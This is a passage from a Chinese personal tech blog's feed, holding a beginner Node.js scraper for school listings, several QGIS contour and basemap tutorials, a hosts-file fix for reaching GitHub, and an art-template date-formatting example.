rel="noopener">官网文档</a></p><h2 id="express简介"><a href="#express简介" class="headerlink" title="express简介"></a>express简介</h2><p>基于 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> 平台，快速、开放、极简的 Web 开发框架</p><p><a href="https://www.expressjs.com.cn/" target="_blank" rel="noopener">express中文网</a></p></blockquote><h1 id="模块引入"><a href="#模块引入" class="headerlink" title="模块引入"></a>模块引入</h1><p>在这里其实有个小插曲，一开始是想用<a href="https://www.npmjs.com/package/request" target="_blank" rel="noopener">request</a>模块去请求目标网址，可是不知道出现何种原因，请求不了（用这个模块尝试其它网址是可以的），所以更换成了axios模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> cheerio = <span class="built_in">require</span>(<span class="string">'cheerio'</span>)</span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br></pre></td></tr></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>axios自带promise的使用方法，在get我们需要爬取的网址后，通过cheerio的load方法获取该页面的html结构，我们可以使用$来接收这个变量（官网就是这样写的），然后就可以用类似JQuery的方法去操作里面的元素了，这里我们需要每个学校的学校名，邮编以及联系方式，所以我们可以打开f12查看这些标签的信息，通过唯一的id名或者类名，我们就可以对该节点的子节点元素进行遍历，然后将数据存入我们准备好的txt或者其他文本文件里，之后再做进一步筛选和处理</p><p><img src= "/img/loading.gif" data-src="/2020/08/13/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8node%E8%BF%9B%E8%A1%8C%E7%88%AC%E8%99%AB%E7%9A%84%E7%BB%8F%E5%8E%86/image-20200806104010310.png" alt="image-20200806104010310"></p><p>因为数据分好几页，所以在这里我首先去获取到该页面总共的页数，之后定义了一个for循环，去循环遍历每一页，再对每一页的内容进行爬取</p><p>以下为主要的爬取代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">axios.get(<span class="string">'https://www.ruyile.com/xuexiao/?a=3120'</span>)</span><br><span class="line">    .then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> $ = cheerio.load(response.data)</span><br><span class="line">        <span class="keyword">let</span> a = $(<span class="string">'.zys'</span>).text() <span class="comment">//获取总页数</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="params">a</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//遍历每一页</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= a; i++) &#123;</span><br><span class="line">            axios.get(<span class="string">'https://www.ruyile.com/xuexiao/?a=3120&amp;p='</span> + i)</span><br><span class="line">                .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">let</span> school = []</span><br><span class="line">                    <span class="keyword">let</span> $ = cheerio.load(res.data) <span class="comment">//获取当前页的html内容</span></span><br><span class="line">                    $(<span class="string">'.xxlb div h4'</span>).each(<span class="function">(<span class="params">i, ele</span>) =&gt;</span> &#123;</span><br><span class="line">                        school.push($(ele).text()) <span class="comment">//遍历每个h4标签后存入预先定义好的数组中</span></span><br><span class="line">                    &#125;)</span><br><span class="line">                    <span class="keyword">return</span> school</span><br><span class="line">                &#125;)</span><br><span class="line">                .then(<span class="function">(<span class="params">school</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">//将每一次遍历得到的数组存入txt文件里</span></span><br><span class="line">                    fs.appendFile(<span class="string">'a.txt'</span>, <span class="string">'\n'</span> + school + <span class="string">'\n'</span>, <span class="string">'utf8'</span>, (err) =&gt; &#123;</span><br><span class="line">                        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">'err'</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>其它标签的内容使用同样的原理进行爬取</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总觉得这次写的代码有哪些欠缺（运行起来是没有问题的），或者美观度，易读性不太好，遇到的困难就是在request模块下请求不到该网址，最后想不出什么解决方法，所以也更换了模块，就当是第一次爬虫的锻炼吧（好长的路要走），也是第一次尝试用nodejs进行爬虫。</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS制作等高面</title>
      <link href="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/"/>
      <url>/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>本实验将介绍两种等高面的制作方法，旨在掌握等高面的可视化表达，掌握DEM数据转等高线及等高线的提取、转面、拆分及配色。</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p><strong>提取等高线</strong></p><p>利用DEM数据提取等高线，打开菜单栏上【栅格】|【提取】|【等值线】提取等高线</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/532c402f41f09b897e1dea69de0ccfb0.png" alt></p><p>设置好参数，点击运行</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/2d96307bf7ab7a0a5a50e4b7adf8b781.png" alt></p><p>提取等高线效果：</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/3442b4386d540c680249f79c03b3725e.png" alt></p></li><li><p><strong>等高线转面</strong></p><p>利用菜单栏上【矢量】|【几何图形工具】|【线条到多边形】或者处理工具箱中【矢量几何图形】|【线条到多边形】将等高线转换为等高面</p><p>设置好相应参数运行</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/8e4ea8f60d04a58d6ec73b776634c39b.png" alt></p><p>将等高面符号化，在图层样式上将图层设置为【渐进】，VALUE取ELEV，然后点击【分类】，选择合适的渐变色进行表达</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/ec2caede439aa10e887815b043a3c642.png" alt></p><p>完成之后，可以看到有些面数据会被覆盖掉，我们打开图层属性通过【高级】|【符号水平】调整数据绘制顺序，数值越大的在越上面</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/ad7c6e7fde17062100271a922823b32f.png" alt></p></li><li><p><strong>拆分等高面</strong></p><p>拆分等高面，将等高面按照高程属性划分为对个图层数据，因为需要设置多个表达式进行筛选，我们利用批处理的方式进行，在处理工具箱<br>|【矢量选择】|【按属性提取】</p><p>右键【以批处理方式执行】</p><p>设置好表达式后，点击运行</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/694eba74a19888a26da19a79451824cb.png" alt></p><p>生成多个数据图层，分别在每个图层属性选中简单填充，勾选【绘制效果】，然后点击<img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/d7cd73c01c870103bddf90307d3c1d77.png" alt>符号后，勾选【阴影】显示等高线凸出的效果</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/6c1ae054acb23f2bc8a18aa00d4d5d36.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/63cbcf8319079ef8609b5d5b03dc1950.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/cf12a58a22e39b488ba7f137a6c50fd8.png" alt></p><p>若想要显示等高面凹陷的效果，可以将上述绘制效果改为【内阴影】</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/867c7dc8ac0ace82340243397825fe9e.png" alt></p></li><li><p>等高面配色</p><p>等高面凸出效果：</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/4e9db38ea92432bfb0c6c77922ecefc2.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\9b7adb5a980ca38070c08270bbd75f6.png"></p><p>等高面凹陷效果：</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/84e537ada855868cd906b5b7c2baebe2.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\4c2e3b2edebcdc36127a9eaaf6b1c86.png"></p></li><li><p><strong>小技巧</strong></p><p>使用axismaps网站提供的等高线数据，进行快速等高面绘制 <a href="https://contours.axismaps.com/#9/27.990458/86.934165" target="_blank" rel="noopener">https://contours.axismaps.com/#9/27.990458/86.934165</a> </p><p>打开百度坐标拾取系统，拾取你要研究区域的坐标点（这里以珠穆朗玛峰为例）</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/d8b102e2c6f620d1593357f410847ee0.png" alt></p><p>然后根据经纬度大小相应的改动网址，等待绘制等高线</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/d726f046c7ed6799bc4dc7304f9fe846.png" alt></p><p>加载完后，将等高线的单位改为meter</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/ca371af8a73eb72176ede2abd3a69839.png" alt></p><p>切换下载界面进行下载【下载GeoJSON】</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/2eef308b898bdcacfc27c112a8bb112f.png" alt></p><p>将文件直接拖进QGIS中，并重新导出为shapefile</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/91001d5560dba3ef280f081f98351ebb.png" alt></p><p>进行符号化，将描边线宽改为0.06</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/da12ce8cf6682e94f0dcc23cd1cbddf7.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/963dc1b844ee517f17fb40a62c9cd357.png" alt></p><p>然后按照上述【绘制效果】进行设置</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/33e1d9ff99f38827261a69d6be70c036.png" alt></p><p>珠穆朗玛峰等高面效果图：</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%88%B6%E4%BD%9C%E7%AD%89%E9%AB%98%E9%9D%A2/b8ffc475370a6daf756596d3b141c616.png" alt></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS半透明立体影像图</title>
      <link href="/2020/08/02/QGIS/QGIS%E5%8D%8A%E9%80%8F%E6%98%8E%E7%AB%8B%E4%BD%93%E5%BD%B1%E5%83%8F%E5%9B%BE/"/>
      <url>/2020/08/02/QGIS/QGIS%E5%8D%8A%E9%80%8F%E6%98%8E%E7%AB%8B%E4%BD%93%E5%BD%B1%E5%83%8F%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>根据DEM数据和影像数据制作半透明立体影像图</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p>加载DEM数据并进行符号化</p><p>选择【单坡段伪色彩】然后选择自己喜欢的颜色，为了符合实际，这里进行反转颜色</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%8D%8A%E9%80%8F%E6%98%8E%E7%AB%8B%E4%BD%93%E5%BD%B1%E5%83%8F%E5%9B%BE/208dbffe15d274e17f76094f2d7576a5.png" alt></p><p>复制一个DEM数据图层，在DEM图层上右键【创建图层副本】，然后进行符号化，设为山体阴影，如果你的高程数据差异足够大，可以调高【垂直夸张因子】使得数据更具有立体效果</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%8D%8A%E9%80%8F%E6%98%8E%E7%AB%8B%E4%BD%93%E5%BD%B1%E5%83%8F%E5%9B%BE/e4559e82e3f94363c080395de251b714.png" alt></p><p>把源DEM数据的透明度降低</p><p>然后再【XYZ Tiles】中加载影像服务放到最底部</p><p>适当调一下透明度即可完成半透明立体影像图的制作</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E5%8D%8A%E9%80%8F%E6%98%8E%E7%AB%8B%E4%BD%93%E5%BD%B1%E5%83%8F%E5%9B%BE/a2f3145a56b6f9ed5a0048de33ddbeb7.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS等高线艺术图</title>
      <link href="/2020/08/02/QGIS/QGIS%E7%AD%89%E9%AB%98%E7%BA%BF%E8%89%BA%E6%9C%AF%E5%9B%BE/"/>
      <url>/2020/08/02/QGIS/QGIS%E7%AD%89%E9%AB%98%E7%BA%BF%E8%89%BA%E6%9C%AF%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>Mapbox上有一个十分好看的等高线服务数据，我们可以根据哪个行政区想要这个艺术效果，在QGIS中进行实现。</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p>首先在QGIS浏览窗口上【XYZ Tiles】上右键单击【新建连接】</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E7%AD%89%E9%AB%98%E7%BA%BF%E8%89%BA%E6%9C%AF%E5%9B%BE/76c13aeec410cbd8e900da4791b608c5.png" alt></p><p>输入名称和网址<a href="https://c.tiles.mapbox.com/v3/dnomadb.hgp0dahj/{z}/{x}/{y}.png" target="_blank" rel="noopener">https://c.tiles.mapbox.com/v3/dnomadb.hgp0dahj/{z}/{x}/{y}.png</a></p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E7%AD%89%E9%AB%98%E7%BA%BF%E8%89%BA%E6%9C%AF%E5%9B%BE/b42259ecde605e0bf10e555bf6eb9e7c.png" alt></p><p>然后双击打开服务，即可在窗口上看到</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E7%AD%89%E9%AB%98%E7%BA%BF%E8%89%BA%E6%9C%AF%E5%9B%BE/0112739123a01f9a3f86d79f083d4c43.png" alt></p><p>加载你要制作艺术图的行政区域</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E7%AD%89%E9%AB%98%E7%BA%BF%E8%89%BA%E6%9C%AF%E5%9B%BE/0d00e61d1e5beaa593e72154f1f66f63.png" alt></p><p>然后将填充颜色改为黑色</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E7%AD%89%E9%AB%98%E7%BA%BF%E8%89%BA%E6%9C%AF%E5%9B%BE/9111b07d66c90a393d18e769839b3e7d.png" alt></p><p>把行政区域放到等高线底部，将混色模式改为【变亮】即可</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E7%AD%89%E9%AB%98%E7%BA%BF%E8%89%BA%E6%9C%AF%E5%9B%BE/7a15ac0360315bbde32babaee57ec06c.png" alt></p><p>艺术图初步即成，你可以自己再加修饰</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E7%AD%89%E9%AB%98%E7%BA%BF%E8%89%BA%E6%9C%AF%E5%9B%BE/e0de619306391bdbf7b157f8f93349f2.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS添加自定义Mapbox底图</title>
      <link href="/2020/08/02/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89Mapbox%E5%BA%95%E5%9B%BE/"/>
      <url>/2020/08/02/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89Mapbox%E5%BA%95%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>Mapbox发布了一个可以进行地图设计并发布的网页版工具，该网页可以根据你所导入的图片颜色进行地图设计，还可以进行样式的编辑，并最终给你一个服务地址，你可以在QGIS中添加该底图或者作为明信片导出图片等。</p><p>网址：<a href="https://apps.mapbox.com/cartogram/" target="_blank" rel="noopener">https://apps.mapbox.com/cartogram/</a></p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p>你可以上传不同你喜欢的照片，里面的色彩搭配是符合你的口味的，然后让它呈现在地图上</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89Mapbox%E5%BA%95%E5%9B%BE/9614efbf385438aa80d9328a39d7c7c4.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89Mapbox%E5%BA%95%E5%9B%BE/b8e56e9a6a05a15cdff8aa110b8b73f1.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89Mapbox%E5%BA%95%E5%9B%BE/e5de04e9be2b40857af2f6f6e530ed12.png" alt></p><p>左下角的图片你可以选择不同的颜色初步搭配，然后再上面会出现一个【Saving】点击则会出现样式编辑面</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89Mapbox%E5%BA%95%E5%9B%BE/49da8682f1dadd42b9ab289b6454d515.png" alt></p><p>若你想用地图制作明信片，则可以在右上方菜单栏选择【打印】或者【分享】都有生成jpg或png的向导</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89Mapbox%E5%BA%95%E5%9B%BE/3c3bbc132c322a2693f3f4a1ab75b0a4.png" alt></p><p>或者你想用这个服务，你可以选择【分享】|【生产】|【开发人员资源】|【第三方】选择你要的类型，这里QGIS选择WMS/WMTS，复制服务地址</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89Mapbox%E5%BA%95%E5%9B%BE/a3c8edd9f81bd7267f666aa451bea104.png" alt></p><p>打开QGIS，在浏览窗口WMS/WMTS上右键【新建连接】</p><p>输入名字和服务地址即可点击OK</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89Mapbox%E5%BA%95%E5%9B%BE/8988125949f7f07743823cb3c3d30249.png" alt></p><p>然后再WMS/WMTS下拉菜单中找到你刚才设置的名字，双击即可在窗口显示，这个自定义的底图你就可以使用了</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89Mapbox%E5%BA%95%E5%9B%BE/a0aa184a461e50ef8ac082d80b6770ca.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github.com部分页面访问不了 </title>
      <link href="/2020/07/30/github-com%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86/"/>
      <url>/2020/07/30/github-com%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在某一天，我那基于Github创建的博客网站突然访问不了了，art-template的官方文档也访问不了，我一度以为是github的原因，想着过几天会好，然而不是，是网络的问题（这一切都是在我从电信网络切换到移动网络后出现的问题，会不会有关系……）</p><p>要么弹出这个错误</p><p><img src= "/img/loading.gif" data-src="/2020/07/30/github-com%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86/image-20200730131826525.png" alt="image-20200730131826525"></p><p>要么弹出这个错误</p><p><img src= "/img/loading.gif" data-src="/2020/07/30/github-com%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86/image-20200730131835559.png" alt="image-20200730131835559"></p><p>然后，我就查阅了关于这个的问题，解决方案如下</p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><ol><li><p>打开<a href="https://link.jianshu.com/?t=http%3A%2F%2Ftool.chinaz.com%2Fdns" target="_blank" rel="noopener">Dns查询 - 站长工具</a></p></li><li><p>在这里输入你的域名地址</p><p><img src= "/img/loading.gif" data-src="/2020/07/30/github-com%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86/image-20200730132555472.png" alt="image-20200730132555472"></p></li><li><p>将TTL值最小的ip复制一下</p></li><li><p>以管理员身份运行记事本，【文件】→【打开】</p><p><img src= "/img/loading.gif" data-src="/2020/07/30/github-com%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86/image-20200730143738654.png" alt="image-20200730143738654"></p><p>输入以下地址：C:\Windows\System32\drivers\etc</p><p>选择hosts文件打开，如果没有的话在这里将【所有文件.】选上</p><p><img src= "/img/loading.gif" data-src="/2020/07/30/github-com%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86/image-20200730143442283.png" alt="image-20200730143442283"></p></li><li><p>在记事本中将ip地址填上并加上网址域名，如下</p><p><img src= "/img/loading.gif" data-src="/2020/07/30/github-com%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86/image-20200730143550217.png" alt="image-20200730143550217"></p></li><li><p>保存，退出，打开网址试试吧</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>art-template搭配dateFormat实现将时间戳格式化为你想要的日期格式</title>
      <link href="/2020/07/30/art-template%E6%90%AD%E9%85%8DdateFormat%E5%AE%9E%E7%8E%B0%E5%B0%86%E6%97%B6%E9%97%B4%E6%88%B3%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%BA%E4%BD%A0%E6%83%B3%E8%A6%81%E7%9A%84%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F/"/>
      <url>/2020/07/30/art-template%E6%90%AD%E9%85%8DdateFormat%E5%AE%9E%E7%8E%B0%E5%B0%86%E6%97%B6%E9%97%B4%E6%88%B3%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%BA%E4%BD%A0%E6%83%B3%E8%A6%81%E7%9A%84%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>art-template搭配dateFormat实现将时间戳格式化为你想要的日期格式</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><ol><li><p>npm下载对应模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save dateformat</span><br></pre></td></tr></table></figure></li><li><p>页面代码（注意art-template默认渲染的页面后缀名为art，time为渲染的时间数据，’yyyy-mm-dd’为你要定义的时间格式）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; dateFormat(time, 'yyyy-mm-dd')&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>node引用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> template = <span class="built_in">require</span>(<span class="string">'art-template'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> dateFormat = <span class="built_in">require</span>(<span class="string">'dateformat'</span>);</span><br></pre></td></tr></table></figure></li><li><p>配置模板引擎</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">template.defaults.imports.dateFormat = dateFormat;</span><br></pre></td></tr></table></figure></li><li><p>渲染页面并打出在cmd控制台</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> html = template(<span class="string">'06.art'</span>, &#123;</span><br><span class="line">    time: <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(html)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS迁徙图制作</title>
      <link href="/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/"/>
      <url>/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/</url>
      
